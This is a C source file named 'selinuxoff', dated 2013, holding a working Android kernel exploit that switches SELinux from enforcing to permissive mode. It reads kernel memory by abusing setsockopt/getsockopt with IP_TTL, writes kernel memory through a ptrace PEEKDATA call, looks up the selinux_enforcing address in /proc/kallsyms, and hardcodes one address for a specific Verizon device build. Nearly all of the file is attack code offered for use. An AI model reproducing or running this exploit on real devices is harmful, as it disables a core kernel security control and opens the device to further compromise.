/* selinuxoff 2013/12/21 */

/*
 * Copyright (C) 2013 K1MU
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */

#define KPTR_RESTRICT "/proc/sys/kernel/kptr_restrict"
#define KALLSYMS "/proc/kallsyms"

#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <errno.h>
#include <signal.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/ptrace.h>
#include <sys/syscall.h>
#include <sys/system_properties.h>
#include <fcntl.h>

unsigned long selinux_enforcing_address = 0;

bool bChiled;

int read_value_at_address(unsigned long address, unsigned long *value) {
	int sock;
	int ret;
	int i;
	unsigned long addr = address;
	unsigned char *pval = (unsigned char *)value;
	socklen_t optlen = 1;

	*value = 0;
	errno = 0;
	sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock < 0) {
		fprintf(stderr, "socket() failed: %s.\n", strerror(errno));
		return -1;
	}

	for (i = 0; i < sizeof(*value); i++, addr++, pval++) {
		errno = 0;
		ret = setsockopt(sock, SOL_IP, IP_TTL, (void *)addr, 1);
		if (ret != 0) {
			if (errno != EINVAL) {
				fprintf(stderr, "setsockopt() failed: %s.\n", strerror(errno));
				close(sock);
				*value = 0;
				return -1;
			}
		}
		errno = 0;
		ret = getsockopt(sock, SOL_IP, IP_TTL, pval, &optlen);
		if (ret != 0) {
			fprintf(stderr, "getsockopt() failed: %s.\n", strerror(errno));
			close(sock);
			*value = 0;
			return -1;
		}
	}

	close(sock);

	return 0;
}

void ptrace_write_value_at_address(unsigned long int address, void *value) {
	pid_t pid;
	long ret;
	int status;

	bChiled = false;
	pid = fork();
	if (pid < 0) {
		return;
	}
	if (pid == 0) {
		ret = ptrace(PTRACE_TRACEME, 0, 0, 0);
		if (ret < 0) {
			fprintf(stderr, "PTRACE_TRACEME failed: %s\n", strerror(errno));
		}
		bChiled = true;
		signal(SIGSTOP, SIG_IGN);
		kill(getpid(), SIGSTOP);
		exit(EXIT_SUCCESS);
	}

	do {
		ret = syscall(__NR_ptrace, PTRACE_PEEKDATA, pid, &bChiled, &bChiled);
	} while (!bChiled);

	ret = syscall(__NR_ptrace, PTRACE_PEEKDATA, pid, &value, (void *)address);
	if (ret < 0) {
		fprintf(stderr, "PTRACE_PEEKDATA failed: %s\n", strerror(errno));
	}

	kill(pid, SIGKILL);
	waitpid(pid, &status, WNOHANG);
}

int get_addresses() {
	FILE *f = fopen(KPTR_RESTRICT, "w");
	int i;
	if (f == NULL) {
		if (errno = EPERM) {
			printf("You must have root to use this.\n");
			return(-1);
		}
		perror("Open KPTR_RESTRICT:");
		return(-1);
	}
	if (fprintf(f, "1\n") < 0) {
		if (errno = EPERM) {
			printf("You must have root to use this.\n");
			return(-1);
		}
		perror("Open KPTR_RESTRICT:");
		return(-1);
	}

	fclose (f);
	f = fopen(KALLSYMS, "r");
	if (f == NULL) {
		if (errno = EPERM) {
			printf("You must have root to use this.\n");
			return(-1);
		}
		perror("Open KALLSYMS:");
		return(-1);
	}
	char type, symname[512];
	unsigned long addr;

	while (1) {
		i = fscanf(f, "%lx %c %512s", &addr, &type, symname);
		if (i == EOF) {
			fclose(f);
			printf("Can't find selinux_enforcing symbol\n");
			return(-1);
		}

//		printf("%s 0x%lx\n", symname, addr);
		if (strcmp(symname, "selinux_enforcing") == 0) {
			fclose(f);
			selinux_enforcing_address = addr;
			return(0);
		}
	}
}

typedef struct _known_device {
	const char *product;
	const char *build;
	unsigned long int selinux_enforcing_address;
} known_device;

static known_device known_devices[] = {
    {
	.product = "jfltevzw",
	.build = "JSS15J",
	.selinux_enforcing_address = 0xc1160924,
    },

};

static int num_known_devices = sizeof(known_devices) / sizeof(known_devices[0]);

int main(int argc, char **argv) {
	char devicename[PROP_VALUE_MAX];
	char buildid[PROP_VALUE_MAX];
	int i;
	int quiet = 0;

	if (argc > 1) {
		selinux_enforcing_address = strtol(argv[1], NULL, 16);
		quiet = 1;
	}

	__system_property_get("ro.build.product", devicename);
	__system_property_get("ro.build.id", buildid);
	if (!quiet) {
		printf("ro.build.product=%s\n", devicename);
		printf("ro.build.id=%s\n", buildid);
	}

	for (i = 0; i < num_known_devices; i++) {
		if (strcmp(known_devices[i].product, devicename) == 0 &&
		    strcmp(known_devices[i].build, buildid) == 0) {
			selinux_enforcing_address = known_devices[i].selinux_enforcing_address;
			break;
		}
	}
	if (!selinux_enforcing_address && get_addresses() != 0) {
		exit(EXIT_FAILURE);
	}

	unsigned long val;
	if (read_value_at_address(selinux_enforcing_address, &val)) {
		printf("Can't read selinux_enforcing. Exploit will not work\n");
		exit(EXIT_FAILURE);	
	}	
	if (!quiet) {
		printf("selinux_enforcing is at 0x%lx\n", selinux_enforcing_address);
		printf("Initial SELinux mode is %s\n", val ? "Enforcing" : "Permissive");
	}
	if (val != 1 && val != 0) {
		printf("Suspicious initial value - not changing it.\n");
		exit(EXIT_FAILURE);
	} 
	val = 0;
	ptrace_write_value_at_address(selinux_enforcing_address, 0);
	if (read_value_at_address(selinux_enforcing_address, &val)) {
		printf("Can't read back selinux_enforcing. Exploit will not work\n");
		exit(EXIT_FAILURE);	
	}	
	if (!quiet)
		printf("SELinux mode is now %s\n", val ? "Enforcing" : "Permissive");
	exit(EXIT_SUCCESS);
}
